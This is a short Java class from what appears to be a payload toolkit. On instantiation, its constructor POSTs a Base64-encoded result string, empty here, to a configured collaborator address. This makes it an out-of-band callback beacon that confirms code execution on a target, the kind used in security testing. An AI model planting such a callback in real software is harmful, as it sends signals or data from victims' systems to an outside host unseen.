package http.payloads.echo;

import util.Options;

import java.io.BufferedWriter;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Base64;

public class HTTPEcho {
    String result;

    public HTTPEcho() {
        try {
            result = "";
            exec();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void exec() throws Exception {
        echo();
    }

    private void echo() {
        try {
            URL url = new URL(Options.collabAddress);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setDoOutput(true);
            connection.setUseCaches(false);
            connection.connect();

            result = Base64.getEncoder().encodeToString(this.result.getBytes());

            BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(connection.getOutputStream()));
            writer.write(result);
            writer.close();

            if (connection.getResponseCode() == HttpURLConnection.HTTP_OK) {
                System.out.println("OK");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}